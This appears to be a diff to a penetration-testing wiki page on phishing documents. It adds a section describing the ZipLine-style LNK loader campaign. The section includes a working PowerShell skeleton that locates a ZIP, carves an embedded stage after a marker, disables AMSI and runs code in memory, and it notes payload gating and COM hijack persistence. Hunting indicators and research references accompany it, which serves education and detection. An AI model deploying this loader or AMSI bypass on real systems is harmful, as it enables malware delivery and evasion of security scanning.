@@ -21,7 +21,7 @@ DOCX files referencing a remote template (File –Options –Add-ins –Manage: 
 ### External Image Load
 
 Go to: _Insert --> Quick Parts --> Field_\
-_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://\<ip>/whatever
+_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever
 
 ![](<../../images/image (155).png>)
 
@@ -167,6 +167,57 @@ Don't forget that you cannot only steal the hash or the authentication but also 
 - [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
 - [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
+## LNK Loaders + ZIP-Embedded Payloads (fileless chain)
+
+Highly effective campaigns deliver a ZIP that contains two legitimate decoy documents (PDF/DOCX) and a malicious .lnk. The trick is that the actual PowerShell loader is stored inside the ZIP’s raw bytes after a unique marker, and the .lnk carves and runs it fully in memory.
+
+Typical flow implemented by the .lnk PowerShell one-liner:
+
+1) Locate the original ZIP in common paths: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, and the parent of the current working directory.
+2) Read the ZIP bytes and find a hardcoded marker (e.g., xFIQCV). Everything after the marker is the embedded PowerShell payload.
+3) Copy the ZIP to %ProgramData%, extract there, and open the decoy .docx to appear legitimate.
+4) Bypass AMSI for the current process: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
+5) Deobfuscate the next stage (e.g., remove all # characters) and execute it in memory.
+
+Example PowerShell skeleton to carve and run the embedded stage:
+
+```powershell
+$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
+$paths    = @(
+  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
+  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
+)
+$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
+if(-not $zip){ return }
+$bytes = [IO.File]::ReadAllBytes($zip.FullName)
+$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
+if($idx -lt 0){ return }
+$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
+$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+Invoke-Expression $code
+```
+
+Notes
+- Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may gate payloads (serve benign ZIPs based on IP/UA).
+- The next stage frequently decrypts base64/XOR shellcode and executes it via Reflection.Emit + VirtualAlloc to minimize disk artifacts.
+
+Persistence used in the same chain
+- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:
+
+{{#ref}}
+../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
+{{#endref}}
+
+Hunting/IOCs
+- ZIP files containing the ASCII marker string (e.g., xFIQCV) appended to the archive data.
+- .lnk that enumerates parent/user folders to locate the ZIP and opens a decoy document.
+- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
+- Long-running business threads ending with links hosted under trusted PaaS domains.
+
+## References
+
+- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
+- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
+
 {{#include ../../banners/hacktricks-training.md}}
-
-
